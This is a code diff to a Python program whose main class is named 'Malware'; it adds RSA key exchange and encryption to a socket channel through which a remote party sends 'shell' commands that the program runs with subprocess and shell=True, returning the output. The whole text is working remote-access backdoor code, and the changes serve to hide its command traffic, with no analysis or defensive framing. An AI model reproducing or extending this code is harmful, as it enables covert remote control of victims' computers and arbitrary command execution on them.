@@ -65,11 +65,11 @@ class InThread(threading.Thread):
     def run(self):
         conn, in_ip = self.socket.accept()
         print('connection received')
-        #self.init_public_key()
+        self.init_public_key(conn)
         cons = OutThread(in_ip, self.out_port)
         again = True
         while again:
-            msg = conn.recv(1024).decode('UTF-8')
+            msg = self.rsa_decrypt(conn.recv(1024)).decode('UTF-8')
             print(msg)
             if msg == 'exit':
                 again = False
@@ -77,7 +77,7 @@ class InThread(threading.Thread):
             elif msg == 'shell':
                 comm_again = True
                 while comm_again:
-                    command = conn.recv(1024).decode('UTF-8')
+                    command = self.rsa_decrypt(conn.recv(1024)).decode('UTF-8')
                     print(command)
                     if command == '':
                         pass
@@ -85,9 +85,6 @@ class InThread(threading.Thread):
                         comm_again = False
                     else:
                         try:
-                            #resp = subprocess.check_output(command.split(), shell=True)
-                            print(command)
-                            #print(resp)
                             if platform.system() == 'Windows':
                                 resp = subprocess.check_output(command.split(), shell=True)
                                 cons.send(resp.decode('cp850'))
@@ -111,19 +108,19 @@ class InThread(threading.Thread):
                 cons.send(str(resp))
         cons.stop()
         time.sleep(2)
-        self.socket.shutdown(socket.SHUT_RDWR)
+        #self.socket.shutdown(socket.SHUT_RDWR)
         self.socket.close()
         print('closed IN')
         print('Closed socket coming from {}'.format(in_ip))
 
-    def init_public_key(self):
+    def init_public_key(self, conn):
         try:
-            remote_public_key_pem = connection.recv(InThread.BUFFER_SIZE)
+            remote_public_key_pem = conn.recv(1024)
             global remote_public_key
             remote_public_key = load_pem_public_key(remote_public_key_pem, backend=default_backend())
             print("Remote public key successfully loaded")
-        except timeout:
-            self.init_public_key()
+        except socket.timeout:
+            self.init_public_key(conn)
         except ValueError:
             print("Invalid Public Key received")
 
@@ -153,12 +150,12 @@ class OutThread(threading.Thread):
         except ConnectionError:
             print('Unable to connect to {}'.format(self.ip))
 
-        #self.send_public_keys()
+        self.send_public_keys()
 
     def send(self, message):
         try:
             #print('sending', message)
-            self.sock.sendall(message.encode('UTF-8'))
+            self.sock.sendall(self.rsa_encrypt(message.encode('UTF-8')))
         except ConnectionError:
             print('Unable to send <<{}>> to {}'.format(message, self.ip))
 
@@ -193,12 +190,12 @@ class Malware(threading.Thread):
     def __init__(self):
         super().__init__()
 
-        self.prod = InThread()
-
         global private_key
         global public_key_pem
         private_key = self.generate_rsa_keys()
         public_key_pem = self.serialize_public_key(private_key.public_key())
+
+        self.prod = InThread()
         self.start()
         print('started Malware')
 
